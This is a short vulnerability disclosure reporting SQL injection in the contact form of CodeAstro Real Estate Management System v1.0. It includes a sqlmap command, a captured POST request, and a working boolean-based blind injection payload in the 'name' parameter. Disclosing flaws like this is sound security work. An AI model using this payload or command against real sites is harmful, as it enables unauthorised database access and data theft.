# SQLi vulnerability in CodeAstro Real Estate Management System v1.0 of file /contact.php

**vender**:

- CodeAstro Real Estate Management System
- [CodeAstro - Home For All Free Source Codes](https://codeastro.com/)

**SoftLink**:

- https://codeastro.com/real-estate-management-system-in-php-with-source-code/

**Vulnerable File**

- /contact.php

**Version**

- V1.0

### POC

```bash
sqlmap -r request.txt --level 5 --batch
```



```http
POST /contact.php HTTP/1.1
Host: www.realestate.com
Referer: http://www.realestate.com/contact.php
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip, deflate
Cache-Control: max-age=0
Origin: http://www.realestate.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=d4bb5bt4089bi920s8gj8fb0np
Upgrade-Insecure-Requests: 1
Content-Length: 86

name=test&email=test%40test.com&phone=1888888888&subject=1&message=1&send=send+message
```



```
---
Parameter: name (POST)
    Type: boolean-based blind
    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
    Payload: name=test' RLIKE (SELECT (CASE WHEN (7077=7077) THEN 0x74657374 ELSE 0x28 END)) AND 'gSai'='gSai&email=test@test.com&phone=1888888888&subject=1&message=1&send=send message
---
```



![image-20250602120132846](https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202506021201969.png)